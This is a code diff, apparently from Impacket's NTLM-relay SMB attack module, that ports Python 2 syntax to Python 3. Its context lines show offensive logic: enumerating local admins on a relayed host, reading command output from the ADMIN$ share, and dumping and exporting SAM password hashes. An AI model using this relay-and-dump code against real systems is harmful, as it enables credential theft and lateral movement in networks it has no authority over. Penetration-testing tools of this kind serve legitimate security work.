@@ -1,3 +1,4 @@
+from __future__ import print_function
 # SECUREAUTH LABS. Copyright 2018 SecureAuth Corporation. All rights reserved.
 #
 # This software is provided under under a slightly modified version
@@ -79,7 +80,7 @@ class SMBAttack(ProtocolAttack):
 
                 remoteOps  = RemoteOperations(self.__SMBConnection, False)
                 remoteOps.enableRegistry()
-            except Exception, e:
+            except Exception as e:
                 if "rpc_s_access_denied" in str(e): # user doesn't have correct privileges
                     if self.config.enumLocalAdmins:
                         LOG.info(u"Relayed user doesn't have admin on {}. Attempting to enumerate users who do...".format(self.__SMBConnection.getRemoteHost().encode(self.config.encoding)))
@@ -89,7 +90,7 @@ class SMBAttack(ProtocolAttack):
                             LOG.info(u"Host {} has the following local admins (hint: try relaying one of them here...)".format(self.__SMBConnection.getRemoteHost().encode(self.config.encoding)))
                             for name in localAdminNames:
                                 LOG.info(u"Host {} local admin member: {} ".format(self.__SMBConnection.getRemoteHost().encode(self.config.encoding), name))
-                        except DCERPCException, e:
+                        except DCERPCException as e:
                             LOG.info("SAMR access denied")
                         return
                 # Something else went wrong. aborting
@@ -103,7 +104,7 @@ class SMBAttack(ProtocolAttack):
                     self.__answerTMP = ''
                     self.__SMBConnection.getFile('ADMIN$', 'Temp\\__output', self.__answer)
                     self.__SMBConnection.deleteFile('ADMIN$', 'Temp\\__output')
-                    print self.__answerTMP.decode(self.config.encoding, 'replace')
+                    print(self.__answerTMP.decode(self.config.encoding, 'replace'))
                 else:
                     bootKey = remoteOps.getBootKey()
                     remoteOps._RemoteOperations__serviceDeleted = True
@@ -112,7 +113,7 @@ class SMBAttack(ProtocolAttack):
                     samHashes.dump()
                     samHashes.export(self.__SMBConnection.getRemoteHost()+'_samhashes')
                     LOG.info("Done dumping SAM hashes for host: %s", self.__SMBConnection.getRemoteHost())
-            except Exception, e:
+            except Exception as e:
                 LOG.error(str(e))
             finally:
                 if samHashes is not None:
